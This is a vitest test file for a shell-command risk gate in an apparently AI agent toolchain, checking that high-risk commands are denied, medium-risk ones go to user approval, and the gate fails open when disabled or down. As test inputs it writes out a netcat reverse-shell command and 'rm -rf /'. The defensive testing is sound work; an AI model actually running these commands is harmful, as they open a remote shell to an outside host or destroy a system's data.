import type { ToolExecution } from '@deepseek-ai/dsh-tools'
import { describe, expect, it } from 'vitest'
import { checkCommand, heldCommands, shellCommandOf } from '../src/command.ts'
import type { CommandParams, CommandResult } from '../src/protocol.ts'
import type { Gate } from '../src/response.ts'

const exec = (name: string, args: unknown) => ({ name, arguments: args, callId: 'call-731', signal: new AbortController().signal }) as unknown as ToolExecution
function gate(result: CommandResult | Error, calls: CommandParams[] = []): Gate {
  const client = { checkCommand: async (params: CommandParams) => { calls.push(params); if (result instanceof Error) throw result; return result } }
  return { signal: new AbortController().signal, runtimeFor: async () => ({ client }), sessionFor: () => 'session-capability-0000000000000731' } as unknown as Gate
}
const on = () => true

describe('DeepSeek pre-execution shell command check', () => {
  it('checks only the command line of bash and pwsh', async () => {
    expect(shellCommandOf(exec('bash', { command: 'ls', description: 'list' }))).toBe('ls')
    expect(shellCommandOf(exec('pwsh', { command: 'Get-ChildItem' }))).toBe('Get-ChildItem')
    expect(shellCommandOf(exec('read', { path: '/x' }))).toBeUndefined()
    const calls: CommandParams[] = []
    await checkCommand(exec('bash', { command: 'git status' }), gate({ status: 'approved', category: 'shell_command' }, calls), on)
    expect(calls).toEqual([{ session: 'session-capability-0000000000000731', tool: 'bash', call_id: 'call-731', command: 'git status' }])
  })

  it('denies high risk with a hint and keeps its error out of the result gate', async () => {
    const run = exec('bash', { command: 'nc -e /bin/sh x 4444' })
    const decision = await checkCommand(run, gate({ status: 'dangerous', category: 'shell_command', risk: 'high', decision_score: 10 }), on)
    expect(decision).toMatchObject({ kind: 'deny' })
    expect((decision as { reason: string }).reason).toMatch(/blocked this shell command before it ran \(high shell-command risk, score 10\.0\)/)
    expect(heldCommands.has(run)).toBe(true)
  })

  it('asks the user for medium risk through the approval service', async () => {
    const decision = await checkCommand(exec('bash', { command: 'npm install' }), gate({ status: 'dangerous', category: 'shell_command', risk: 'medium', decision_score: 2.5 }), on)
    expect(decision).toMatchObject({ kind: 'ask' })
  })

  it('lets the command run when the check is off, unavailable or failing', async () => {
    const command = exec('bash', { command: 'rm -rf /' })
    expect(await checkCommand(command, gate({ status: 'dangerous', category: 'shell_command', risk: 'high' }), () => false)).toBeUndefined()
    expect(await checkCommand(command, gate({ status: 'unavailable', category: 'shell_command', reason: 'shell_model_missing' }), on)).toBeUndefined()
    expect(await checkCommand(command, gate(Error('runtime down')), on)).toBeUndefined()
  })
})
